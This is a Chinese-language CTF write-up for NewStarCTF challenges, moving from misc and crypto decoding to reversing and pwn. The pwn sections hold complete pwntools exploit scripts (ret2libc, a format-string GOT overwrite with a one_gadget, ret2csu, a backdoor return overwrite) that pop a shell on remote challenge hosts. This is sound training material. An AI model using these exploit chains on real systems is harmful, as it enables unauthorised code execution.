---
title: NewstarCTF WP
date: '2024-12-09 21:07:06'
updated: '2025-04-07 21:33:51'
---
## 1、ez_answer
好好地填好问卷，拿了个88分直接拿到flag

## 2、pleasingMusic
用开源音频处理软件Audacity打开音频，发现有规律性的噪音：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007191607134.png)![](/images/4ce18144cd4c25e23190b56da3856aef.png)

结合题目的倒放信息，利用摩斯密码表将flag得出。

## 3、WhereIsFlag
nc连接靶机，跟着指示找到对应文件夹读取到flag：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007191907986.png)![](/images/dc8a75b0eb0c7eb6e82507e3ab041e5d.png)

本题与linux的基本命令行操作相关

## 4、decompress
逐层解压压缩包发现最后剩下一个带密码的，旁边还有txt文件用正则表达式提示了压缩包密码，直接爆破：

头铁自己写了个python脚本爆破了半个小时...

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007192354823.png)![](/images/8b2ad53e9809ed588004773a2cb47ecb.png)

最终打开flag.zip.001得出flag

## 5、xor
从python脚本可以得出程序进行了异或的算法，再异或一次得回原始数据得出flag：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007192711634.png)![](/images/ed9148907bceddf61e1d647866b3cc1f.png)

## 6、Base
题目数据：

4C4A575851324332474E324547554B494A5A4446513653434E564D444154545A4B354D45454D434E4959345536544B474D5134513D3D3D3D

首先经过`base16`解码得到：

LJWXQ2C2GN2EGUKIJZDFQ6SCNVMDATTZK5MEEMCNIY4U6TKGMQ4Q====

再通过`base32`解码得到：

ZmxhZ3tCQHNFXzBmX0NyWXB0MF9OMFd9

最后通过`base64`解码得到flag：`flag{B@sE_0f_CrYpt0_N0W}`

## 7、begin
用IDA打开附件可执行文件，跟着`main`函数的提示将三部分flag找到：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007193235524.png)![](/images/29b425a3ba12c7f2ab2a2e0b151dae04.png)

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007193314253.png)![](/images/521b9f5f650f3d3ee1f8ea9b1fb351a2.png)

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007193452502.png)![](/images/214e3a4e86a8c52e44506d3410ad6ffe.png)

整理好flag格式即可

## 8、Real Login
IDA逆向知道password为`NewStar！！！`直接nc连接上靶机输入密码即可获得flag

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007193910238.png)![](/images/47521a87322b8fd9e0e545f6f75e5e7a.png)

## 9、Game
IDA逆向得知输入数字不能小于零或大于十，累计大于999则getshell，限时5秒：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007194311037.png)![](/images/ad66a4111c0366bae74e8776afd7273a.png)

脚本：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007194350806.png)![](/images/9b58615cd72b0ec31675998a99b0a0d6.png)

## 10、overwrite
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007194624045.png)![](/images/288108ed3f401afc114e2d1ce321333f.png)

### 细节：整型溢出
从IDA逆向伪代码可以得知`nbytes`这个变量的类型从`int`转变为了`unsigned int`，存在整型溢出漏洞

64位int的范围为`-2147483648`到`2147483647`（即-2<sup>31</sup> 到2<sup>31</sup>-1），可以利用整型溢出将第二次输入的读取长度`nbytes`扩大从而实现对`nptr`区域的覆写，使得`nptr`区域的值大于`114514`（？好臭的数字）

脚本：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241007195507283.png)![](/images/675081b6497eb390dd8bcaae33395a63.png)

## 11、ez_game
checksec检查保护措施：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241008084436424.png)![](/images/405eabb0da509b6cb63b03c7ab697cd4.png)

发现没有canary和PIE

IDA得知`func`函数当中执行了两次`puts`函数和一次`read`函数，再看func函数的栈可以发现可以利用read函数覆盖返回地址：：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241008084153724.png)![](/images/3e2722770b3ad2306eec2945b3d12a3d.png)

推理可以知道是经典的ret2libc：

脚本如下：

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

link=remote("39.106.48.123",22964)
e=ELF("./attachment")
libc=ELF("./libc-2.31.so")

pop_rdi=0x400783

puts_got=e.got['puts']
puts_plt=0x400520 #要使用puts的plt地址

func=0x400686

ret=0x400509
payload1=b"a"*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(func) #第一次payload

link.recvuntil("NewStarCTF!!!!\n")
link.sendline(payload1)
link.recvline()
puts_addr=u64(link.recvline()[:-1].ljust(8,b'\x00'))
print(hex(puts_addr))

puts_libc=libc.sym["puts"]
libc_base=puts_addr - puts_libc
print(hex(libc_base))

system=libc_base+libc.sym["system"]
print(hex(system))
binsh=libc_base+next(libc.search(b'/bin/sh'))
print(hex(binsh))

payload2=b"a"*0x58+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system) #第二次payload
print(payload2)

link.send(payload2)
link.interactive() 
```

## 12、easy fmt
先附上exp：

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# link=remote("8.147.132.32",44894)
link=process("./pwn")
e=ELF("./pwn")

link.recvuntil("data: \n")
link.send(b'%19$p')

call_main_addr=link.recv(14)
libc_base=int(call_main_addr,16)-0x29D90 # libc基址得在动调时候用vmmap指令看libc的最低地址

ogg=libc_base+0xebc81

offset=8
puts_got=e.got["puts"]
payload = fmtstr_payload(offset, {puts_got: ogg & 0xffffff},0,write_size="short")

gdb.attach(link,'b *0x4012FE')
pause()

data = payload
modified_payload = data.decode('utf-8').replace('lln', 'hn').replace('aaaa', 'aaaaa').encode('utf-8')

link.recvuntil("data: \n")
link.send(modified_payload)

link.interactive()
```

其中这两段比较有趣：

```python
offset=8
puts_got=e.got["puts"]
print(hex(puts_got))
payload = fmtstr_payload(offset, {puts_got: ogg & 0xffffff},0,write_size="short")
......
modified_payload = data.decode('utf-8').replace('lln', 'hn').replace('aaaa', 'aaaaa').encode('utf-8')
```

看IDA：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241017132921761.png)![](/images/9c5894a66decc80f59e9b22a90f53e02.png)

从IDA可以知道`read`函数只能读入0x30个字节的数据，但是`fmt_str`函数默认是以bytes的单位写入地址的，  
所以没加参数限制的情况下自动生成的payload会超过30字节无法实现修改`puts`函数的got表。

### 细节：fmtstr_payload
而`fmtstr_payload`函数有一个参数是`write_size`，可以自己选择每次写入的大小，  
所以把参数设置为`short`类型就可以缩短payload的长度。

但是这还不够短，可以接着在payload的内容上下功夫：

我们知道函数地址相对于libc基址的差距不大，就低几位有差别，可以利用这个特征，只替换`puts`函数got表地址的低几位  
把onegadget的地址留下低三位：

```python
payload = fmtstr_payload(offset, {puts_got: ogg & 0xffffff},0,write_size="short")
```



初始的payload：

![](/images/410e11af7ce4d2a8c1c846be751573ba.png)

还得把payload里面覆盖八个字节的lln换成覆盖两个字节的hn，再把后面的padding部分加多个'a'：  
（不改的话got表就被覆盖得只剩低三位了）

![](/images/f67e1905c0d9aa30c81ea99f6a09b8e5.png)

## 13、My_GBC!!!!!
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241017141351611.png)![](/images/d884f7b65265ebe333d3de0b69adaf8d.png)

从IDA可以看出，`read`函数读取的字节数很多可以栈溢出，但是有个`encrypt`函数把`buf`里面的数据加密了再存回原位  
这就导致原来的栈溢出payload无法实现该有功能，接着看`encrypt`函数内部，发现是对数据进行了左循环和异或的操作，可逆  
所以可以将要执行的payload先手进行右循环和异或之后传入：

```python
def ror(value,rotation,bits=8):
    rotation=rotation % bits
    return ((value >> rotation)|(value << (bits - rotation))) & ((1 << bits)-1)

def decrypt(value):
    res=ror(value,3)
    res=res^0x5A
    return long_to_bytes(res)

payload1_enc=b''
for i in range(len(payload1)):
    payload1_enc+=decrypt(payload1[i])
```

而且IDA里面还发现整个程序用的都是`write`函数，  
我们只能够利用`write`函数来泄露别的函数地址从而获得libc基址，实现ret2libc  
由于`write`函数有三个参数，  
所以我们需要利用gadget控制`rdi`、`rsi`、`rdx`三个寄存器的值，  
而通过`ROPgadget`指令可以发现程序当中并没有直接的`pop rdx`、`pop rsi`和`pop rdi`的指令：

（在IDA里面查看图中的`pop rdi`指令的地址可以发现其实是将`pop r15`的指令拆开了）

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241017144318075.png)![](/images/a3605dd8f40df8d7670f3da788123b55.png)

### 重点：ret2csu
不过在函数列表发现了`libc_csu_init`函数，汇编如下：

![](C:\Users\garhi\Pictures\微信截图_20241017143535.png)![](/images/70e2b7135112182072cbcae3e53c7cc4.png)

可以通过利用`csu1`部分和`csu2`部分来修改我们所需要的寄存器的内容从而达到`pop 对应寄存器`的效果：

！！！payload1讲解：

1、栈溢出返回至`csu1`部分的`pop rbx`指令，把0赋予`rbx`为了让后来call语句当中地址不受`rbx`影响

2、接着把1赋予`rbp`，后来rbx加1后与rbp相同从而不执行`jnz`语句

3、接着把1赋予`r12`，后来`r12`的值传给了`rdi`，`write`函数的第一个参数是文件描述符fd，1是标准输出即命令行输出

4、接着把从二进制文件当中获得的`read`函数的got表地址赋予r13，后来r13的值又传给了`rsi`，`write`函数的第二个参数是写入标准输出的数据来源缓冲区，有一个向地址内取值的操作，所以是got表而不是plt表

5、接着把8赋予`r14`，后来`r14`的值传给了`rdx`，`write`函数的第三个参数是读取字节数，8个字节够了

6、接着把从二进制文件中获得的`write`函数的got表地址赋予`r15`，也就是后来`call`语句后面的`[r15+rbx*8]`

（汇编语句当中"[ ]"表示地址，向地址内取值，所以这里填的`write`的got表）

7、跳到`csu2`部分的汇编指令继续执行

8、分别把`r14`、`r13`、`r12`的值传给了对应的寄存器，然后`call write`函数把`read`函数的真实地址输出了

9、由于没有`retn`语句，程序会接着往下执行到`csu1`部分的代码，但是我们这时需要返回到`main`函数当中，所以输入一些垃圾数据让接下来的几个`pop`指令pop掉，最后再接上`main`函数的返回地址，假装一切从未发生过（

这里有一个重点：有6个寄存器要pop掉，但是实际上payload里面塞了0x38(7*8)个'a'，这是因为在`pop`语句之前还有一个`add rsp,8`的语句将栈顶下移了八个字节，payload的0x38个'a'的前面8个是被跳过了没有被pop掉的

剩下的ret2libc步骤就跳过了，附上exp：（注意栈平衡）

```python
from pwn import *
from Crypto.Util.number import *

context.log_level='debug'

link=remote("8.147.129.74",34860)
# link=process("./mygbc") 
e=ELF("./mygbc")
libc=ELF("./libc.so.6")

csu1=0x4013AA
csu2=0x401390
pop_rdi=0x4013b3
ret=0x40101a

def ror(value,rotation,bits=8):
    rotation=rotation % bits
    return ((value >> rotation)|(value << (bits - rotation))) & ((1 << bits)-1)

def decrypt(value):
    res=ror(value,3)
    res=res^0x5A
    return long_to_bytes(res)

payload1=b'a'*0x18
payload1+=p64(csu1) #跳转到csu1部分
payload1+=p64(0)
payload1+=p64(1)
payload1+=p64(1)
payload1+=p64(e.got["read"])
payload1+=p64(8)
payload1+=p64(e.got["write"])
payload1+=p64(csu2)
payload1+=b'a'*0x38
payload1+=p64(e.sym["main"])

payload1_enc=b''
for i in range(len(payload1)):
    payload1_enc+=decrypt(payload1[i])

link.recvuntil("thing: ")
link.send(payload1_enc)

read_addr=u64(link.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

libc_base=read_addr-libc.sym["read"]
system=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b'/bin/sh'))

payload2=b'a'*0x18
payload2+=p64(ret)
payload2+=p64(pop_rdi)
payload2+=p64(binsh)
payload2+=p64(system)

payload2_enc=b''
for i in range(len(payload2)):
    payload2_enc+=decrypt(payload2[i])

link.send(payload2_enc)
link.interactive()
```

## 补充
### inverted world
反序覆盖下一个函数返回地址

exp：

```python
from pwn import *

context.log_level='debug'
link=remote("101.200.139.65",37044)
# link=process("./ivw")

ret=0x40101a
backdoor=0x40137C
payload=b'a'*0x100+p64(backdoor)[::-1]

link.recvuntil("root@AkyOI-VM:~#")
link.sendline(payload)
link.interactive()
```

